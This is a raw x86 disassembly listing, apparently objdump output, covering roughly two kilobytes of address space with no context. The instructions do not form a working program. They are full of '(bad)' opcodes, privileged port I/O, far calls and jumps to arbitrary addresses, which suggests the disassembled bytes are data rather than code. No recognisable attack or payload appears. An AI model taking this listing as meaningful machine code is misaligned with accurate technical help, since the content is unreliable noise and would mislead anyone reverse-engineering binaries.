  51331c:	es dec esp
  51331e:	call   0x484d:0x59c77035
  513325:	jne    0x51338b
  513327:	lea    ebx,[eax]
  513329:	in     eax,dx
  51332a:	and    eax,0x91449955
  51332f:	test   eax,0x4c8352a5
  513334:	pop    ds
  513335:	in     eax,dx
  513336:	or     DWORD PTR [esi+0x18cc3b4f],esp
  51333c:	xor    ah,dh
  51333e:	sbb    esi,DWORD PTR [edi-0x3d]
  513341:	sub    al,0xb7
  513343:	iret   
  513344:	gs std 
  513346:	jp     0x51333c
  513348:	push   esp
  513349:	popf   
  51334a:	push   ss
  51334b:	enter  0x2938,0x85
  51334f:	call   0x7ba9:0xd3609f34
  513356:	fwait
  513357:	and    BYTE PTR [esp-0x59290702],ch
  51335e:	push   cs
  51335f:	mov    al,0xeb
  513361:	pop    ds
  513362:	in     eax,0xa
  513364:	fdivrp st(6),st
  513366:	adc    DWORD PTR [edx+0x11f8061c],0xdce2f1e0
  513370:	test   al,0x99
  513372:	xor    eax,0xaec57356
  513377:	xor    eax,0x9df35e99
  51337c:	call   0x194b4481
  513381:	mov    ds:0xc9d8c9e1,eax
  513386:	arpl   WORD PTR [edi],bp
  513388:	mov    ah,0x4b
  51338a:	pop    edi
  51338b:	pop    ebp
  51338c:	xor    ecx,ebp
  51338e:	sub    ebx,DWORD PTR [ecx-0x62419cc1]
  513394:	and    DWORD PTR [esi],0x30fe7da8
  51339a:	dec    edi
  51339b:	pop    ecx
  51339c:	in     eax,dx
  51339d:	fiadd  DWORD PTR [eax-0x7d2041ae]
  5133a3:	std    
  5133a4:	(bad)  
  5133a5:	fwait
  5133a6:	push   ecx
  5133a7:	or     ch,BYTE PTR [eax]
  5133a9:	(bad)  [edi+0x59]
  5133ac:	js     0x5133a6
  5133ae:	ins    BYTE PTR es:[edi],dx
  5133af:	jmp    0x51341d
  5133b1:	les    esp,FWORD PTR [ecx-0x6e]
  5133b4:	push   esi
  5133b5:	ret    
  5133b6:	add    ecx,DWORD PTR [edx]
  5133b8:	data16 inc cl
  5133bb:	pop    edi
  5133bc:	out    dx,eax
  5133bd:	loop   0x5133f4
  5133bf:	ret    
  5133c0:	cld    
  5133c1:	adc    bh,ch
  5133c3:	or     ebx,edi
  5133c5:	fidivr WORD PTR [esi]
  5133c7:	jno    0x5133f2
  5133c9:	test   DWORD PTR [esi-0x63],ecx
  5133cc:	out    dx,eax
  5133cd:	mov    WORD PTR [ebx],cs
  5133cf:	mov    cl,0x30
  5133d1:	adc    BYTE PTR [ebp+edi*2+0x70ec8e2c],bl
  5133d8:	sti    
  5133d9:	or     eax,0xa6718fb8
  5133de:	and    dh,BYTE PTR [edi]
  5133e0:	jle    0x513397
  5133e2:	or     eax,0x30d75c76
  5133e7:	call   0xf3b1:0x9b3bfe7c
  5133ee:	out    0xa5,al
  5133f0:	push   esp
  5133f1:	fcom   DWORD PTR [eax+eiz*1+0x3d6f830a]
  5133f8:	mov    al,ds:0x7965185
  5133fd:	jecxz  0x5133c7
  5133ff:	jle    0x513450
  513401:	(bad)  
  513402:	cdq    
  513403:	clc    
  513404:	xlat   BYTE PTR ds:[ebx]
  513405:	mov    dh,0x1e
  513407:	inc    ebx
  513408:	ins    BYTE PTR es:[edi],dx
  513409:	dec    ebp
  51340a:	add    DWORD PTR [ebp-0x7670ab59],ebp
  513410:	lds    eax,FWORD PTR [bx+si]
  513413:	jle    0x513456
  513415:	data16 aam 0x4c
  513418:	inc    ebp
  513419:	ror    BYTE PTR [edx-0x7f],0x31
  51341d:	imul   edx,ecx,0x22fda398
  513423:	xchg   esp,eax
  513424:	call   0xc938:0xb236d2af
  51342b:	out    dx,eax
  51342c:	xchg   ebx,eax
  51342d:	fcmovne st,st(1)
  51342f:	pushf  
  513430:	jecxz  0x51346b
  513432:	je     0x513471
  513434:	pop    ebp
  513435:	int    0x37
  513437:	clc    
  513438:	popa   
  513439:	push   esp
  51343a:	pusha  
  51343b:	test   al,0x7c
  51343d:	and    dl,BYTE PTR [edx]
  51343f:	sbb    DWORD PTR [ebx+0x28],eax
  513442:	mov    bl,0xc1
  513444:	push   ecx
  513445:	xchg   ebp,eax
  513446:	push   0x14
  513448:	push   ebx
  513449:	mov    DWORD PTR [eax+0x77],esi
  51344c:	sbb    edi,DWORD PTR [eax]
  51344e:	in     eax,0xfa
  513450:	add    DWORD PTR [edi+0x79],ebp
  513453:	std    
  513454:	cwde   
  513455:	out    0x2f,eax
  513457:	cmp    dh,bh
  513459:	stc    
  51345a:	pop    eax
  51345b:	pop    esi
  51345c:	cmpps  xmm2,XMMWORD PTR [edx],0x56
  513460:	retf   0x7f8f
  513463:	lahf   
  513464:	scas   al,BYTE PTR es:[edi]
  513465:	mov    al,0x49
  513467:	jno    0x5134a0
  513469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51346a:	ds pop ebp
  51346c:	jge    0x513425
  51346e:	in     al,0x1f
  513470:	into   
  513471:	cmc    
  513472:	outs   dx,BYTE PTR ds:[esi]
  513473:	jge    0x5133f6
  513475:	mov    esi,0xe96cedf1
  51347a:	jns    0x5133fe
  51347c:	mov    DWORD PTR [ecx],ebx
  51347e:	sbb    DWORD PTR [ebx+0x7476e06d],esi
  513484:	pop    edi
  513485:	sbb    bl,ch
  513487:	push   0xda0c668d
  51348c:	mov    eax,0x9d70edd1
  513491:	outs   dx,BYTE PTR ds:[esi]
  513492:	mov    BYTE PTR [ecx],ah
  513494:	cmp    ecx,DWORD PTR [edx+0x5a5e82c]
  51349a:	pop    edi
  51349b:	jp     0x513451
  51349d:	mov    edi,0x41c0aef1
  5134a2:	icebp  
  5134a3:	leave  
  5134a4:	in     al,0x48
  5134a6:	fistp  QWORD PTR [ebp-0xf5cc64d]
  5134ac:	push   ecx
  5134ad:	outs   dx,BYTE PTR ds:[esi]
  5134ae:	xor    DWORD PTR [eax+0x4e3c3a11],esi
  5134b4:	mov    ds:0x3a9ad046,eax
  5134b9:	cmp    eax,0xc37626f8
  5134be:	pop    ebp
  5134bf:	and    eax,0x464a2142
  5134c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5134c5:	add    DWORD PTR [esi+0x712b6ae2],ecx
  5134cb:	adc    al,0xe4
  5134cd:	pop    es
  5134ce:	out    dx,eax
  5134cf:	sub    DWORD PTR [edi],edx
  5134d1:	dec    ebp
  5134d2:	fcmovnbe st,st(7)
  5134d4:	fnstenv ds:0x2ec21140
  5134da:	adc    ebx,DWORD PTR [ecx-0x56]
  5134dd:	dec    edx
  5134de:	lods   eax,DWORD PTR ds:[esi]
  5134df:	cmp    eax,0x698cda58
  5134e4:	popa   
  5134e5:	pop    edi
  5134e6:	scas   eax,DWORD PTR es:[edi]
  5134e7:	xchg   ebp,eax
  5134e8:	mov    esp,0x4e41189
  5134ed:	jmp    0x730b2cca
  5134f2:	xchg   ebx,eax
  5134f3:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  5134f5:	push   0x67f64e94
  5134fa:	test   al,0x44
  5134fc:	or     DWORD PTR ds:0x7632a98a,ebp
  513502:	cld    
  513503:	(bad)  
  513504:	mov    ecx,0xcbac782f
  513509:	jno    0x513524
  51350b:	jp     0x5134fc
  51350d:	adc    ebx,DWORD PTR [edi-0x355fd48a]
  513513:	dec    ebp
  513514:	sub    dh,BYTE PTR [ecx-0x24]
  513517:	pop    ecx
  513518:	popa   
  513519:	adc    BYTE PTR [edx-0x37],bl
  51351c:	sbb    ebp,edx
  51351e:	test   eax,0xd2b4fb59
  513523:	cdq    
  513524:	out    dx,eax
  513525:	scas   eax,DWORD PTR es:[edi]
  513526:	fwait
  513527:	xchg   ecx,eax
  513528:	sbb    esi,eax
  51352a:	mov    bl,0x2a
  51352c:	jne    0x5134f6
  51352e:	pop    esp
  51352f:	dec    esi
  513530:	jl     0x5134c6
  513532:	sub    dh,BYTE PTR [edi+eax*1+0x4]
  513536:	test   eax,0x73780780
  51353b:	pop    edx
  51353c:	sahf   
  51353d:	std    
  51353e:	or     dh,ch
  513540:	and    esi,0x49d3aedc
  513546:	aad    0xce
  513548:	inc    eax
  513549:	add    edi,DWORD PTR [esp+ecx*1-0x68]
  51354d:	lods   al,BYTE PTR ds:[esi]
  51354e:	lods   eax,DWORD PTR ds:[esi]
  51354f:	xchg   ecx,eax
  513550:	pop    edx
  513551:	mov    bl,BYTE PTR [eax+0x6e32dc42]
  513557:	push   ds
  513558:	or     ch,BYTE PTR [ecx+0x19193063]
  51355e:	inc    esp
  51355f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  513560:	lock imul esi,DWORD PTR [ebx+ebx*4-0x16],0x9774da3c
  513569:	mov    bl,0x9f
  51356b:	call   0x3fcfd446
  513570:	xchg   esi,eax
  513571:	jmp    0xbf3:0xad0e4ded
  513578:	into   
  513579:	jb     0x5134fe
  51357b:	fiadd  DWORD PTR [ebp+0x13]
  51357e:	or     DWORD PTR [ebx-0x36db613c],0xffffffa8
  513585:	inc    eax
  513586:	cmp    ecx,DWORD PTR [ebp+0x61]
  513589:	imul   esi,DWORD PTR ds:0xfc7281c7,0x2bc0dcdb
  513593:	sub    bh,BYTE PTR [ebp+0x7]
  513596:	sub    edi,edx
  513598:	mov    ss,eax
  51359a:	outs   dx,BYTE PTR ds:[esi]
  51359b:	sbb    esi,0x91776442
  5135a1:	and    BYTE PTR [ebx+0x12],cl
  5135a4:	loope  0x513532
  5135a6:	rcr    DWORD PTR [esi-0x2daac5fd],1
  5135ac:	add    al,0xcb
  5135ae:	(bad)  
  5135af:	mov    al,ds:0x9136095b
  5135b4:	mov    ch,0x50
  5135b6:	call   0x9954c896
  5135bb:	std    
  5135bc:	sub    DWORD PTR [edx+0x212dddc2],edx
  5135c2:	jmp    DWORD PTR ds:0x382477ad
  5135c8:	popf   
  5135c9:	sbb    ah,bh
  5135cb:	dec    ecx
  5135cc:	cdq    
  5135cd:	jno    0x5135c7
  5135cf:	mov    edx,DWORD PTR [edx-0x37]
  5135d2:	fiadd  DWORD PTR [eax-0xd]
  5135d5:	stc    
  5135d6:	pop    ss
  5135d7:	cmc    
  5135d8:	pop    esi
  5135d9:	ror    BYTE PTR [edi+0x25],0xdc
  5135dd:	add    cl,cl
  5135df:	cmp    al,cl
  5135e1:	les    ebx,FWORD PTR [ebx+0x51a5a159]
  5135e7:	jp     0x5135fb
  5135e9:	adc    eax,0x57c4012d
  5135ee:	pop    ecx
  5135ef:	xchg   esp,eax
  5135f0:	arpl   cx,si
  5135f2:	mov    BYTE PTR [esi],dl
  5135f4:	xchg   ebp,eax
  5135f5:	in     eax,dx
  5135f6:	call   0xf9d8:0x19a309a1
  5135fd:	fs hlt 
  5135ff:	pause  
  513601:	cli    
  513602:	sub    ebx,edx
  513604:	sub    cl,BYTE PTR [eax+0x476dd06c]
  51360a:	and    eax,0x890364e
  51360f:	sbb    al,0x19
  513611:	sbb    al,0x6d
  513613:	repz inc edx
  513615:	repz ret 
  513617:	lods   eax,DWORD PTR ds:[esi]
  513618:	xchg   ebp,eax
  513619:	into   
  51361a:	or     bh,BYTE PTR [edi+0xb]
  51361d:	(bad)  
  51361e:	sub    esi,DWORD PTR [ecx]
  513620:	(bad)  
  513621:	cmp    eax,0x687f3b36
  513626:	mov    WORD PTR [edx+eiz*1],ss
  513629:	sbb    bl,BYTE PTR [esi]
  51362b:	mov    es,WORD PTR [esi-0x7f]
  51362e:	mov    esi,0xfe778eec
  513633:	push   ds
  513634:	popf   
  513635:	mov    bh,0xe2
  513637:	and    al,0x1d
  513639:	or     BYTE PTR [ebx-0x2],0xb7
  51363d:	repnz enter 0x6829,0x53
  513642:	leave  
  513643:	pop    es
  513644:	add    dl,dh
  513646:	cdq    
  513647:	xor    edx,esp
  513649:	leave  
  51364a:	dec    edi
  51364b:	sbb    DWORD PTR [edx+0x53],esi
  51364e:	xchg   DWORD PTR [edx-0x49],eax
  513651:	xor    al,BYTE PTR [ecx-0x4b6109ae]
  513657:	inc    edx
  513658:	gs aad 0xf4
  51365b:	ss pop esp
  51365d:	jle    0x513615
  51365f:	enter  0xdf17,0x1b
  513663:	ja     0x513625
  513665:	and    eax,0xd989dd38
  51366a:	dec    ebp
  51366b:	sbb    bh,BYTE PTR [edi+0x44]
  51366e:	cmp    DWORD PTR [ecx-0x3a62dd6],esi
  513674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  513675:	jns    0x51366f
  513677:	xchg   esp,eax
  513678:	repz cmp al,0xb8
  51367b:	repz or edi,esp
  51367e:	cmp    al,0xff
  513680:	inc    edx
  513681:	loop   0x513654
  513683:	(bad)  
  513684:	jmp    0xbbcda458
  513689:	daa    
  51368a:	push   esp
  51368b:	(bad)  
  51368c:	test   edi,0xcfbba0d5
  513692:	push   0x707bebc7
  513697:	loopne 0x5136cb
  513699:	outs   dx,BYTE PTR ds:[esi]
  51369a:	mov    BYTE PTR [edx+0x44],bl
  51369d:	in     al,dx
  51369e:	sar    DWORD PTR [ebp+0x22fbb3db],1
  5136a4:	push   cs
  5136a5:	inc    esi
  5136a6:	scas   al,BYTE PTR es:[edi]
  5136a7:	jns    0x513634
  5136a9:	xor    DWORD PTR [ebp+0x58798531],esp
  5136af:	adc    al,BYTE PTR [ecx]
  5136b1:	adc    eax,esp
  5136b3:	jmp    0x8d6771dd
  5136b8:	stos   BYTE PTR es:[edi],al
  5136b9:	stos   DWORD PTR es:[edi],eax
  5136ba:	out    0x1a,al
  5136bc:	ret    
  5136bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5136be:	sar    BYTE PTR [esi-0x47b41e27],cl
  5136c4:	cs pop ds
  5136c6:	into   
  5136c7:	loope  0x513744
  5136c9:	cdq    
  5136ca:	clc    
  5136cb:	push   ds
  5136cc:	aaa    
  5136cd:	xchg   esp,eax
  5136ce:	cs mov ah,0xf9
  5136d1:	push   ss
  5136d2:	dec    esi
  5136d3:	adc    BYTE PTR [esi-0x15],dl
  5136d6:	push   cs
  5136d7:	lods   al,BYTE PTR ds:[esi]
  5136d8:	push   0xffffffcd
  5136da:	shr    BYTE PTR ds:0xeae8c8ea,0x13
  5136e1:	sub    BYTE PTR [edx+esi*4+0x7c],ah
  5136e5:	test   ebp,eax
  5136e7:	rol    DWORD PTR [edi-0x5c],1
  5136ea:	push   esp
  5136eb:	pushf  
  5136ec:	mov    ch,0xfa
  5136ee:	clc    
  5136ef:	fsub   QWORD PTR [ebp-0x1023b45e]
  5136f5:	ins    BYTE PTR es:[edi],dx
  5136f6:	xchg   edx,eax
  5136f7:	(bad)  
  5136f8:	adc    al,0x20
  5136fa:	xor    bl,BYTE PTR [eax+eiz*1+0x21]
  5136fe:	scas   eax,DWORD PTR es:[edi]
  5136ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  513700:	pop    eax
  513701:	and    ch,BYTE PTR [edi]
  513703:	outs   dx,BYTE PTR ds:[esi]
  513704:	aaa    
  513705:	push   esi
  513706:	mov    al,ds:0xa98242f0
  51370b:	sub    DWORD PTR [edx],edx
  51370d:	jb     0x51376d
  51370f:	dec    ebx
  513710:	loope  0x513749
  513712:	mov    ebp,0x92862c4e
  513717:	iret   
  513718:	jmp    0x513769
  51371a:	out    0x56,al
  51371c:	sub    DWORD PTR [edx+0x9c8a4b1],ecx
  513722:	neg    DWORD PTR [edi+0x6aaafcdd]
  513728:	jle    0x513780
  51372a:	mov    WORD PTR [ebp+0x4c],gs
  51372d:	or     al,0x76
  51372f:	cdq    
  513730:	jmp    0xabee2347
  513735:	fs pushf 
  513737:	arpl   si,bx
  513739:	fstp   DWORD PTR [eax+0x52]
  51373c:	test   eax,0xab5a499
  513741:	fistp  QWORD PTR [edx+0x2e]
  513744:	jp     0x513753
  513746:	fnstsw WORD PTR [edx-0x17e63b83]
  51374c:	xchg   edx,eax
  51374d:	pop    es
  51374e:	not    DWORD PTR [esp]
  513751:	les    ebp,FWORD PTR ds:[ecx+ebp*1-0x3a]
  513756:	cmp    BYTE PTR [edi+0x3e8284b9],ch
  51375c:	fld    TBYTE PTR [esi-0x223fc138]
  513762:	push   ecx
  513763:	pop    ss
  513764:	and    al,0x3c
  513766:	hlt    
  513767:	aaa    
  513768:	lds    edi,FWORD PTR [ebp+eiz*1+0x6766b035]
  51376f:	adc    eax,0x8f3d6ddb
  513774:	adc    DWORD PTR [ecx],esi
  513776:	fmul   QWORD PTR [esi-0x65a722de]
  51377c:	aas    
  51377d:	push   ds
  51377e:	out    0x7,eax
  513780:	loope  0x51379d
  513782:	dec    ecx
  513783:	ret    
  513784:	(bad)  
  513785:	mov    ah,0xa3
  513787:	call   0x8de2:0x66b5156c
  51378e:	inc    esp
  51378f:	arpl   bx,sp
  513791:	retf   
  513792:	adc    edi,DWORD PTR [ebp+0x7343fc01]
  513798:	xor    BYTE PTR [edi+0x57],ch
  51379b:	jp     0x513755
  51379d:	out    dx,al
  51379e:	mov    bl,0x24
  5137a0:	fwait
  5137a1:	mov    cl,0xd6
  5137a3:	cli    
  5137a4:	sahf   
  5137a5:	jge    0x5137cd
  5137a7:	push   ss
  5137a8:	inc    eax
  5137a9:	in     eax,0x2c
  5137ab:	or     eax,0x3e67b8ed
  5137b0:	push   ebx
  5137b1:	or     al,0x94
  5137b3:	cs enter 0xaafd,0xb4
  5137b8:	lds    esp,FWORD PTR ss:[edi+0x77]
  5137bc:	dec    edx
  5137bd:	add    al,0xb4
  5137bf:	adc    al,0x8a
  5137c1:	mov    edi,0xe070107f
  5137c6:	imul   DWORD PTR [edx-0x5b]
  5137c9:	ja     0x513778
  5137cb:	cmp    ebx,DWORD PTR [ecx+0x42b2cbe4]
  5137d1:	js     0x51378d
  5137d3:	sti    
  5137d4:	and    DWORD PTR [eax+0x41],esp
  5137d7:	ja     0x513852
  5137d9:	sub    eax,0xcb03c68c
  5137de:	je     0x5137d1
  5137e0:	jl     0x5137b4
  5137e2:	shl    bh,0x0
  5137e5:	pop    esi
  5137e6:	jns    0x51382a
  5137e8:	jmp    0x513782
  5137ea:	icebp  
  5137eb:	shl    esi,1
  5137ed:	push   ecx
  5137ee:	jmp    0x51381c
  5137f0:	out    dx,al
  5137f1:	sub    BYTE PTR [esi],ah
  5137f3:	sbb    ebp,esi
  5137f5:	mov    DWORD PTR [eax*8-0x370fafbd],0x5747c602
  513800:	mov    edx,0xa7158c84
  513805:	sub    eax,DWORD PTR [eax+ecx*2-0x1330d234]
  51380c:	dec    eax
  51380d:	mov    bh,0x9
  51380f:	push   es
  513810:	mov    ds:0x26f2fa1d,eax
  513815:	mov    ebp,0xb7865a1b
  51381a:	mov    ds:0x190870bc,al
  51381f:	or     al,0x5e
  513821:	ja     0x5137e8
  513823:	cdq    
  513824:	cwde   
  513825:	or     DWORD PTR ds:0xa47a26ac,ecx
  51382b:	jnp    0x513868
  51382d:	jp     0x5137ba
  51382f:	dec    eax
  513830:	dec    DWORD PTR [edi]
  513832:	outs   dx,BYTE PTR ds:[esi]
  513833:	pushf  
  513834:	mov    ebx,0xaeaca11c
  513839:	pop    esi
  51383a:	push   es
  51383b:	fstp   QWORD PTR [edi+0x4aa6747d]
  513841:	mov    eax,ds:0x13c3e016
  513846:	bound  ebx,QWORD PTR [eax]
  513848:	ja     0x7fae3b4
  51384e:	inc    eax
  51384f:	ins    DWORD PTR es:[edi],dx
  513850:	retf   0xecf7
  513853:	cmp    BYTE PTR [ebx],al
  513855:	fadd   DWORD PTR [ecx-0x6e]
  513858:	cmc    
  513859:	mov    al,ds:0xa05194d3
  51385e:	repnz mov dh,0xf1
  513861:	ja     0x5137ec
  513863:	xor    ebx,DWORD PTR [ebx-0x3140d67]
  513869:	call   0xe131:0x6ca5e43b
  513870:	lock inc esi
  513872:	popf   
  513873:	jge    0x51381d
  513875:	cmp    al,0xfb
  513877:	fisub  DWORD PTR [eax+0x75]
  51387a:	ret    0x5299
  51387d:	jo     0x513873
  51387f:	pop    ds
  513880:	push   es
  513881:	push   ds
  513882:	addr16 add al,0xff
  513885:	shl    DWORD PTR [ebx+0x3029f15d],0xb0
  51388c:	pop    ebx
  51388d:	sub    DWORD PTR [ebp+eax*1+0x74],esi
  513891:	fdiv   QWORD PTR [edi-0x6c]
  513894:	out    0xf3,al
  513896:	or     al,bh
  513898:	mov    ah,0x3a
  51389a:	and    eax,0xfc2cb00
  51389f:	adc    dh,BYTE PTR [esi+0x43]
  5138a2:	dec    ecx
  5138a3:	enter  0x7548,0xca
  5138a7:	les    edx,FWORD PTR [eax]
  5138a9:	rcr    DWORD PTR [ebp+0x1e],1
  5138ac:	mov    al,ds:0x7725d5aa
  5138b1:	sbb    BYTE PTR [eax+0x44],dh
  5138b4:	mov    al,ds:0xddbc5d2d
  5138b9:	dec    ebx
  5138ba:	xchg   esp,eax
  5138bb:	mov    esp,0x716ebff8
  5138c0:	xchg   edx,eax
  5138c1:	outs   dx,DWORD PTR ds:[esi]
  5138c2:	pop    eax
  5138c3:	adc    eax,0xfffffff9
  5138c6:	(bad)  
  5138c7:	mov    bh,0x46
  5138c9:	dec    edx
  5138ca:	prefetch (bad)
  5138cb:	or     eax,0x27d598c0
  5138d0:	inc    esp
  5138d1:	sbb    eax,0x258016ad
  5138d6:	ja     0x513910
  5138d8:	xchg   ecx,eax
  5138d9:	mov    ebp,0xac706a07
  5138de:	and    DWORD PTR ds:0x4de1ee6d,ebx
  5138e4:	xchg   ebp,eax
  5138e5:	out    0x91,al
  5138e7:	(bad)  
  5138e8:	or     al,0x59
  5138ea:	xor    eax,0xf56a38fb
  5138ef:	pop    ebx
  5138f0:	cmp    dl,bh
  5138f2:	jg     0x513932
  5138f4:	shl    BYTE PTR [ecx+edi*4],0xfc
  5138f8:	clc    
  5138f9:	retf   
  5138fa:	mov    ebx,0x9bfed7c8
  5138ff:	dec    edi
  513900:	mov    ebx,0x1b662afc
  513905:	mov    edi,0xea9c0190
  51390a:	popf   
  51390b:	ret    
  51390c:	or     eax,0x73aeaffe
  513911:	mov    ah,BYTE PTR [ebp+0x45]
  513914:	sub    eax,0xdcca5d12
  513919:	jmp    0xaf2a9496
  51391e:	repz fdiv st(1),st
  513921:	pop    ss
  513922:	dec    edi
  513923:	cmp    ecx,eax
  513925:	cmc    
  513926:	shl    dl,1
  513928:	mov    BYTE PTR [ebp-0x56],al
  51392b:	xchg   edi,eax
  51392c:	leave  
  51392d:	fdiv   st(2),st
  51392f:	mov    ebx,0xd7920aa
  513934:	xor    edi,DWORD PTR [ecx-0x49]
  513937:	push   ebx
  513938:	and    eax,0x24c6e6d8
  51393d:	enter  0x8e4b,0xd
  513941:	mov    edi,0xf5c104bc
  513946:	ror    DWORD PTR [ecx],cl
  513948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  513949:	pop    esi
  51394a:	mov    esp,0xe99701e5
  51394f:	dec    esp
  513950:	das    
  513951:	inc    esp
  513952:	retf   
  513953:	pop    ecx
  513954:	enter  0x7a37,0xc6
  513958:	sbb    esi,DWORD PTR [eax]
  51395a:	or     al,0x63
  51395c:	int    0x6c
  51395e:	or     ch,BYTE PTR [eax]
  513960:	mov    ds,WORD PTR [esi-0x7f]
  513963:	repz jmp 0x5138f3
  513966:	loope  0x5139ae
  513968:	mov    ch,0x4b
  51396a:	pop    edi
  51396b:	xchg   ecx,eax
  51396c:	inc    esp
  51396d:	leave  
  51396e:	test   BYTE PTR fs:[esi],bl
  513971:	int    0xfe
  513973:	jb     0x5139df
  513975:	jne    0x5139b9
  513977:	(bad)  
  513978:	popf   
  513979:	sub    eax,DWORD PTR ds:0x41d881a5
  51397f:	fmul   QWORD PTR [edx+0x3355bc7]
  513985:	int3   
  513986:	xchg   esp,eax
  513987:	sbb    bl,0xfa
  51398a:	pop    es
  51398b:	cmp    eax,0xf26dc44b
  513990:	bound  ebx,QWORD PTR [eax+0x66]
  513993:	addr16 and dl,ch
  513996:	retf   0x1c93
  513999:	xchg   ebx,eax
  51399a:	imul   ebp,edi,0x24fd068b
  5139a0:	adc    BYTE PTR [eax+0x59],ah
  5139a3:	push   ss
  5139a4:	les    ecx,FWORD PTR ds:0xf567b2d3
  5139aa:	inc    edx
  5139ab:	cmp    DWORD PTR [ebx+0x5d032553],ebp
  5139b1:	les    edi,FWORD PTR [edx]
  5139b3:	cmp    al,BYTE PTR [edi]
  5139b5:	ret    
  5139b6:	aas    
  5139b7:	in     eax,0x8a
  5139b9:	aaa    
  5139ba:	js     0x513a3a
  5139bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5139bd:	mov    bl,0x5f
  5139bf:	dec    eax
  5139c0:	ins    DWORD PTR es:[edi],dx
  5139c1:	add    BYTE PTR [edx-0x15],al
  5139c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5139c5:	dec    esi
  5139c6:	jo     0x513a41
  5139c8:	dec    ecx
  5139c9:	arpl   WORD PTR [edx+0x3b],dx
  5139cc:	(bad)
  5139cf:	ror    DWORD PTR [ebp+0x3f6696b3],cl
  5139d5:	sub    eax,0x826a804e
  5139da:	(bad)  
  5139db:	in     eax,dx
  5139dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5139dd:	sub    ebx,DWORD PTR [ebp+0x54062449]
  5139e3:	test   al,ch
  5139e5:	mov    esp,0x5dbcdd78
  5139ea:	push   ebp
  5139eb:	stos   DWORD PTR es:[edi],eax
  5139ec:	pop    ebp
  5139ed:	ret    0xc4cb
  5139f0:	mov    esi,0xf5a761b0
  5139f5:	and    edi,esp
  5139f7:	out    dx,eax
  5139f8:	jg     0x5139d1
  5139fa:	inc    ebp
  5139fb:	out    0xdc,eax
  5139fd:	add    ecx,eax
  5139ff:	test   eax,0x62e99544
  513a04:	or     ecx,DWORD PTR [eax+0x44cba409]
  513a0a:	mov    esp,0xe300aae9
  513a0f:	dec    ecx
  513a10:	and    BYTE PTR [eax-0x5e],cl
  513a13:	cmp    cl,0x7b
  513a16:	adc    ah,BYTE PTR [ebp-0x41d581df]
  513a1c:	loope  0x513a33
  513a1e:	repnz mov BYTE PTR [ebx-0x500e21b7],cl
  513a25:	jns    0x513a4c
  513a27:	sbb    esi,DWORD PTR [ecx]
  513a29:	add    eax,0xbd2a25a6
  513a2e:	sti    
  513a2f:	pop    ds
  513a30:	pop    esp
  513a31:	aad    0xfd
  513a33:	in     al,0xa8
  513a35:	push   ebx
  513a36:	std    
  513a37:	in     al,dx
  513a38:	push   esi
  513a39:	sbb    dh,BYTE PTR [ebp+0x1f]
  513a3c:	out    dx,al
  513a3d:	and    ah,BYTE PTR [ebp+0x5]
  513a40:	pushf  
  513a41:	or     BYTE PTR ds:0x10921de5,0x3b
  513a48:	push   cs
  513a49:	ja     0x513a40
  513a4b:	in     al,dx
  513a4c:	jle    0x513a51
  513a4e:	ret    
  513a4f:	cs jnp 0x513a75
  513a52:	sub    edx,ecx
  513a54:	fnsave [edi+0x7fd1821b]
  513a5a:	loopne 0x513a65
  513a5c:	call   0xe338749e
  513a61:	fistp  DWORD PTR [ecx-0x51]
  513a64:	(bad)  
  513a65:	mov    BYTE PTR [eax+0x49],ah
  513a68:	aas    
  513a69:	jmp    0x4b848014
  513a6e:	mov    ?,edx
  513a70:	aaa    
  513a71:	mov    edi,0x4f8a6c14
  513a76:	or     al,0x5d
  513a78:	push   edi
  513a79:	mov    BYTE PTR [eax+eiz*4],ah
  513a7c:	mov    eax,DWORD PTR [ebp+eax*2-0x62]
  513a80:	pushf  
  513a81:	js     0x513a63
  513a83:	cld    
  513a84:	xchg   esp,eax
  513a85:	aad    0x92
  513a87:	stos   DWORD PTR es:[edi],eax
  513a88:	mov    eax,ebp
  513a8a:	jno    0x513b02
  513a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  513a8d:	ins    DWORD PTR es:[edi],dx
  513a8e:	lahf   
  513a8f:	xor    bh,ch
  513a91:	scas   al,BYTE PTR es:[edi]
  513a92:	leave  
  513a93:	rol    BYTE PTR [esi-0x67],0xe
  513a97:	inc    ebx
  513a98:	(bad)  
  513a99:	repnz pop ecx
  513a9b:	push   ebx
  513a9c:	mov    ah,0x1b
  513a9e:	outs   dx,BYTE PTR ds:[esi]
  513a9f:	hlt    
  513aa0:	test   al,0x6b
  513aa2:	gs sti 
  513aa4:	test   DWORD PTR [di+0x17],esi
  513aa8:	(bad)  
  513aa9:	mov    al,ds:0x2bc015e7
  513aae:	inc    esp
  513aaf:	sti    
  513ab0:	mov    DWORD PTR [edx+0x36],ebx
  513ab3:	aaa    
  513ab4:	pop    ss
  513ab5:	daa    
  513ab6:	add    DWORD PTR ds:0x8d7431a2,edi
  513abc:	ffree  st(6)
  513abe:	sbb    esp,esp
  513ac0:	hlt    
  513ac1:	adc    esi,edx
  513ac3:	jle    0x513b21
  513ac5:	cmp    bh,BYTE PTR [eax+esi*1+0x4f]
  513ac9:	mov    ah,ch
  513acb:	daa    
  513acc:	inc    ebx
  513acd:	enter  0xd882,0xd9
  513ad1:	mov    ebx,DWORD PTR [ebx+0x35]
  513ad4:	std    
  513ad5:	fnstcw WORD PTR [ebp+0x0]
  513ad8:	xchg   ebx,eax
  513ad9:	sub    DWORD PTR [edx+0x234519a],ebx
  513adf:	(bad)  
  513ae0:	mov    esi,0xa948718d
  513ae5:	je     0x513ad0
  513ae7:	lea    ecx,[esp+edi*1-0x7f]
  513aeb:	in     al,dx
  513aec:	xchg   esi,eax
  513aed:	xchg   edx,eax
  513aee:	push   esi
  513aef:	pop    ebx
  513af0:	jge    0x513ac7
  513af2:	call   0x9f955e10
  513af7:	in     eax,dx
  513af8:	aas    
  513af9:	shl    DWORD PTR [edx+ecx*2],cl
  513afc:	push   esi
  513afd:	dec    edi
  513afe:	ins    BYTE PTR es:[edi],dx
  513aff:	(bad)  
  513b00:	push   ebp
